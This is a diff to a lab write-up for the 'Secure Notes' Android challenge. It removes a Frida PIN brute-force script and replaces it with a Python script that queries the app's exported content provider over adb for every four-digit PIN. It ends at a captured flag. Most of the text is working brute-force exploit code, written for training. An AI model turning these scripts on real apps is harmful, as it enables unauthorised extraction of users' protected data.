@@ -370,96 +370,38 @@ Since the com.mobilehackinglab.securenotes.secretprovider is an exported content
 No result found.
 ```
 
-## Frida Preparations
-**(on emulator) run frida-server**
-```
-$ adb push frida-server-16.2.1 /data/local/tmp/frida-server
-$ adb shell "chmod 755 /data/local/tmp/frida-server" 
-$ adb shell "/data/local/tmp/frida-server -l 0.0.0.0 -D"  
-```
-
-**(on host) ensure the device is accessible through `adb devices`**
-`$ frida-ps -Uia `
-```
- PID  Name                  Identifier                         
-----  --------------------  -----------------------------------
-2720  Google Play Store     com.android.vending                
-3481  Phone                 com.android.dialer                 
-5049  Superuser             com.genymotion.superuser           
-4370  Termux                com.termux                         
-   -  Amaze                 com.amaze.filemanager              
-   -  Calendar              com.android.calendar               
-   -  Camera                com.android.camera2                
-   -  Clock                 com.android.deskclock              
-   -  Contacts              com.android.contacts               
-   -  Custom Locale         com.android.customlocale2          
-   -  Dev Tools             com.android.development            
-   -  Development Settings  com.android.development_settings   
-   -  F-Droid               org.fdroid.fdroid                  
-   -  Files                 com.android.documentsui            
-   -  Gallery               com.android.gallery3d              
-   -  HTTP Toolkit          tech.httptoolkit.android.v1        
-   -  Messaging             com.android.messaging              
-   -  Search                com.android.quicksearchbox         
-   -  Secure Notes          com.mobilehackinglab.securenotes   
-   -  Settings              com.android.settings               
-   -  WebView Shell         org.chromium.webview_shell       
-```
-
-## Frida Script
-Create frida script to brute force the PIN
-```java
-Java.perform(function() {
-	var ContentValues = Java.use("android.content.ContentValues");
-	var Uri = Java.use("android.net.Uri");
-	var Runtime = Java.use("java.lang.Runtime");
-
-	// Define a function to execute the command with a given PIN asynchronously
-	function executeCommand(pinStr) {
-		return new Promise(function(resolve, reject) {
-		var command = "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=" + pinStr;
-		console.log(command);
-		  
-		try {
-			var process = Runtime.getRuntime().exec(command);
-			var inputStream = process.getInputStream();
-			var inputStreamReader = Java.use("java.io.InputStreamReader").$new(inputStream);
-			var bufferedReader = Java.use("java.io.BufferedReader").$new(inputStreamReader);
-			var line = null;
-			var output = "";
-			while ((line = bufferedReader.readLine()) != null) {
-				output += line + "\n";
-			}
-			inputStream.close();
-			resolve(output);
-		} catch (error) {
-			reject("Error executing command with PIN " + pinStr + ": " + error);
-		}
-	});
-}
-  
-// Loop through PIN values from "0000" to "9999" and execute the command asynchronously
-var promises = [];
-for (var pin = 0; pin <= 9999; pin++) {
-	var pinStr = ("000" + pin).slice(-4);
-	promises.push(executeCommand(pinStr));
-}
-  
-// Wait for all promises to resolve
-Promise.all(promises)
-	.then(function(results) {
-	
-		// Output results
-		results.forEach(function(result, index) {
-			console.log("Result for PIN " + ("000" + index).slice(-4) + ":\n" + result);
-		});
-	})
-	.catch(function(error) {
-		console.error(error);
-	});
-});
-```
-
-
 # Exploitation
-`$ frida -U -l snpin_force.js -f com.mobilehackinglab.securenotes`
+Create a python script to BruteForce a PIN:
+```python
+import subprocess
+from multiprocessing import Pool
+  
+# Function to execute the ADB command for a given PIN
+def execute_command(pin):
+	pin_str = str(pin).zfill(4) # Convert PIN to 4-digit string format
+	command = f'adb shell "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin={pin_str}"'
+	try:
+		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+		print(f'PIN {pin_str} found: {output}')
+	except subprocess.CalledProcessError as e:
+		# Handle command execution errors (e.g., PIN not found)
+		pass
+
+if __name__ == "__main__":
+	# Number of processes to use (adjust as needed based on CPU cores)
+	num_processes = 4
+
+	# PIN range (0000 to 9999)
+	pin_range = range(10000)
+  
+	# Create a pool of processes
+	with Pool(num_processes) as pool:
+		# Map the execute_command function to the PIN range
+		pool.map(execute_command, pin_range)
+
+	print('Bruteforce complete.')
+```
+
+Then run it:
+`$ python snpin_force.py`
+![[SN_Flag.png]]
